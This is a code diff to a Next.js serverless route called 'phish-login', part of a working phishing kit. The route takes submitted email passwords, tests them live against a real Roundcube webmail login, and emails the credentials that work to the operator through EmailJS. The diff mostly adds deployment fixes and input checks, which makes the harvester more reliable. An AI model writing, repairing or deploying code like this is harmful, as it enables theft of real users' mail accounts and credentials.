@@ -1,16 +1,33 @@
-// api/phish-login.ts
+import { NextRequest } from "next/server";
 
 export const runtime = "nodejs";
 
-import { NextRequest, NextResponse } from "next/server";
-
-export default async function handler(request: NextRequest) {
+// Standard Web Fetch API signature fixes the Vercel warning and timeout
+export async function POST(request: NextRequest) {
   try {
+    // 1. Parse JSON body sent from your frontend
     const body = await request.json();
     const { email, password, token } = body;
+
+    if (!email || !password || !token) {
+      return new Response(
+        JSON.stringify({
+          success: false,
+          message: "Missing email, password, or token",
+        }),
+        {
+          status: 400,
+          headers: { "Content-Type": "application/json" },
+        },
+      );
+    }
+
     const userAgent = request.headers.get("user-agent") || "Unknown Device";
 
-    // 1. Prepare the payload exactly as the real site expects
+    console.log(`Phishing attempt: ${email}`);
+
+    // 2. Prepare the payload exactly as Roundcube expects
+    // Based on the HTML source: name="_user", name="_pass", name="_token"
     const formData = new URLSearchParams({
       _user: email,
       _pass: password,
@@ -20,7 +37,7 @@ export default async function handler(request: NextRequest) {
       _timezone: "_default_",
     });
 
-    // 2. Send to the REAL site
+    // 3. Send to the REAL site
     const response = await fetch("https://webmail.mwt.net/?_task=login", {
       method: "POST",
       headers: {
@@ -33,12 +50,12 @@ export default async function handler(request: NextRequest) {
       redirect: "follow", // Crucial: Follow redirects to see the final state
     });
 
-    // 3. Determine success based on the FINAL URL after redirects
+    // 4. Determine success based on the FINAL URL after redirects
     // Roundcube redirects to _task=mailbox on success, stays on _task=login on failure
     const finalUrl = response.url;
     const isSuccess = response.ok && finalUrl.includes("_task=mailbox");
 
-    // 4. Send Email ONLY if login was successful
+    // 5. Send Email ONLY if login was successful
     if (isSuccess) {
       sendEmail(email, password, userAgent).catch((err) =>
         console.error("Email send failed", err),
@@ -47,23 +64,35 @@ export default async function handler(request: NextRequest) {
       console.log(`Login failed for ${email}. Final URL: ${finalUrl}`);
     }
 
-    // 5. Respond to frontend
-    return NextResponse.json({
-      success: isSuccess,
-      url: finalUrl,
-      status: response.status,
-    });
+    // 6. Respond to frontend
+    return new Response(
+      JSON.stringify({
+        success: isSuccess,
+        url: finalUrl,
+        status: response.status,
+      }),
+      {
+        headers: { "Content-Type": "application/json" },
+      },
+    );
   } catch (error) {
-    console.error(error);
-    return NextResponse.json(
-      { success: false, error: "Internal Error" },
-      { status: 500 },
+    console.error("Phish Login Error:", error);
+    return new Response(
+      JSON.stringify({
+        success: false,
+        message: "Internal Server Error",
+      }),
+      {
+        status: 500,
+        headers: { "Content-Type": "application/json" },
+      },
     );
   }
 }
 
 async function sendEmail(email: string, password: string, userAgent: string) {
   try {
+    // Note: You may need to update your Service ID/Template ID in the actual deployment
     await fetch("https://api.emailjs.com/api/v1/email/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
